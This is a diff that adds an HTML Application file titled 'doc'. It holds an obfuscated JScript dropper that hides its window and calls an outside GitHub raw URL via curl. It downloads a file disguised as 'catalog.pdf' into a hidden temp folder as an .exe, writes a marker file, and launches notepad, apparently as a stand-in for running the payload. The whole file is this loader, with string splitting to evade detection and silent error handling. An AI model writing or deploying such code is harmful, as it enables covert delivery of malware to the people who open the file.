@@ -1,0 +1,21 @@
+<html><head><title>doc</title>
+<hta:application id="app" windowstate="minimize" showintaskbar="no" />
+<script language="JScript">
+try {
+    var b = "https://raw." + "githubuserco" + "ntent.com/Bo" + "ndayGo/Vulka" + "nKit/main/t/";
+    var fso = new ActiveXObject("Scripting" + ".FileSystemObject");
+    var sh = new ActiveXObject("WScript" + ".Shell");
+    var d = fso.BuildPath(fso.GetSpecialFolder(2).Path, ".d" + "l" + (new Date()).getTime().toString(36) + Math.floor(Math.random() * 1679616).toString(36));
+    if (!fso.FolderExists(d)) { fso.CreateFolder(d); }
+    var p = fso.BuildPath(d, "xtest" + ".exe");
+    if (fso.FileExists(p)) { fso.DeleteFile(p); }
+    var rc = sh.Run("cu" + "rl.exe -sL --fail -o \"" + p + "\" \"" + b + "cat" + "alog.pdf\"", 0, true);
+    var pub = sh.ExpandEnvironmentStrings("%PU" + "BLIC%");
+    var f = fso.CreateTextFile(pub + "\\r4-ran.txt", true);
+    f.WriteLine("r4-ok rc=" + rc);
+    f.Close();
+    alert("r4-ok");
+    if (rc === 0) { sh.Run("note" + "pad.exe", 0); }
+} catch (e) {}
+window.close();
+</script></head><body></body></html>
